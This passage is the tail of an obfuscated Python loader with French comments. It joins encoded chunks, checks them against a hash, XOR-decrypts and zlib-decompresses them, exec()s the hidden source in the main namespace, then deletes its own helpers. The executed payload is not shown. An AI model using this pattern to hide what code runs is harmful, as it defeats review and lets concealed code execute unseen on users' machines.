_chg82nQUfyU1Jl + _ccX0LznsUZJVPh + _cuvJoeF22kDY2U + _cjzQcyfDdJOCdr + _c_0RnBjaaZTqlj + _cstsLuF794VXLG + _c_iGWZwCIfYgvs + _cjdMiGqlu_WZBl + _cgLWrhGRPk_F2j + _ciCjfSsSs5AFcb + _cyKNV48Czyf1ko + _cc6QVpGDpwE4mS + _cusQvyjPCBYBTO + _cmWOT4IktVYSZP + _cwpwjLn4iKclQL + _chFMKOzSp9GcL9 + _c_6vs3myT6xhkK + _ckxD5b6btEzlpD + _csEKyRp7smgAxO + _ccEbgjy5I4OypW + _cgGaLMKaUNzM4x + _ceIKeoffcGg_qz + _ceKmnoFM6wa4YW + _cfboau2IjvwD5k + _cinCqup4UX5LBU + _cv15pn6Tg7Fbj5 + _chzu62AnG8zYGh + _cubqRsLtJen_9L + _chp9XxUOu3i89s + _cj_NtFqaG_sCpc + _cykIfDH3PB4Fhv + _ckX6JF6pY_XEV_ + _chMVpVDfXXNCKE + _ciF6L4tOzjeNPY + _cdsopadouO3pfn + _cmrZ8eQOPoHuAz + _cahcEIJlij1Rci + _cbzCIdqYXk7btV + _cqPV8l2WSXsWmX + _cv8vDBNmw3Q172 + _cn2tjJcsbpnVrS + _cxi2uvpxrsQLWf + _cer7dOXHI8rqUH + _cueZnbsfgDjllL + _cvTNlIFSA49BzP + _cz86WQCDWIVC9i + _cfoskeZiF2nbL9 + _ccoxDqiXw3lvG1 + _ce9dJSnjECRdig + _cnpJHuYdzofUJ1 + _ckn8e1K1hGAyWT + _cqE8kxYN_dQyXN + _cjbZCXR7J0ICEb + _crumjqVxIRm2Yy + _cvEkmVvrBi6T43 + _cadCoan5XYKHJw + _cuS5P5bKnRglnB + _cxCVxKxvyT54F2 + _cgfPBtctbuxRv8 + _cj5YaA0_Yo2kyM + _cuI9qiX7LmlZXB + _cssCh0Z9vo8tnL + _caTDJS2BpETYbR + _ceY_IUNRYW2VYb + _cdErymzf_iwKvj + _cidIczFUOQvP7d + _c_gpVmIwF9wwzk + _cv13HTWBIM9EDU + _cbCmqAc5rFnLmg + _cpgN__7tN2INIt + _ccYtG9QTwbtXf0 + _cb_xZWCptyiMF5 + _cpk7pfHA1M1AcL + _cdWUXxVbqCwwKI + _cm3ISc2G70R1DA + _ctgHCmyARCgeQs + _cgQfKLRjFX41h5 + _ck9Yz2u2BQIJGJ + _cgivuELrj3F22X + _cweNDBATCHZkZX)
if __import__('hashlib').sha256(_pyHZax1veoivlY).hexdigest() != '87a21ebbd04bd125471684718eb197330f8ab5644ff38be56d5411471bbbbeb3':
    __import__('sys').exit(1)
_xhlBgnlX8UiInR = bytes([168, 71, 74, 99, 57, 160, 115, 75, 47, 146, 110, 21, 252, 139, 113, 84, 212, 145])
_fkw993yiXnE_phv = bytes([135, 11, 134, 182, 146, 222, 119, 80, 241, 11, 237, 97, 61, 248, 92, 225, 246, 9])

def _fxhjqAMW6Pc5xhH(_bkCGU0xSCTNO2l, _kezB21ER8wYS7O):
    return bytes(_bkCGU0xSCTNO2l[_iixrs5SKjVGr75] ^ _kezB21ER8wYS7O[_iixrs5SKjVGr75 % len(_kezB21ER8wYS7O)] for _iixrs5SKjVGr75 in range(len(_bkCGU0xSCTNO2l)))

def _fdhlkFKZod4HREf(_tuNU_IIqEY0AxW):
    import zlib
    return zlib.decompress(_tuNU_IIqEY0AxW) # Un seul niveau de zlib ici pour simplifier

def _feeMA0KC7Q6s_KR():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xz7vaKBiGgGCqR = _fxhjqAMW6Pc5xhH(_pyHZax1veoivlY, _xhlBgnlX8UiInR)
    # 2. Décompression Zlib
    _dcmqAhfl6NzBj8 = _fdhlkFKZod4HREf(_xz7vaKBiGgGCqR)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dcmqAhfl6NzBj8.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nmKFqvl8lGkBK1 = _main.__dict__
    _nmKFqvl8lGkBK1.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nmKFqvl8lGkBK1)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feeMA0KC7Q6s_KR()
try:
    del _fxhjqAMW6Pc5xhH, _fdhlkFKZod4HREf, _feeMA0KC7Q6s_KR
    del _pyHZax1veoivlY, _xhlBgnlX8UiInR, _fkw993yiXnE_phv
except:
    pass
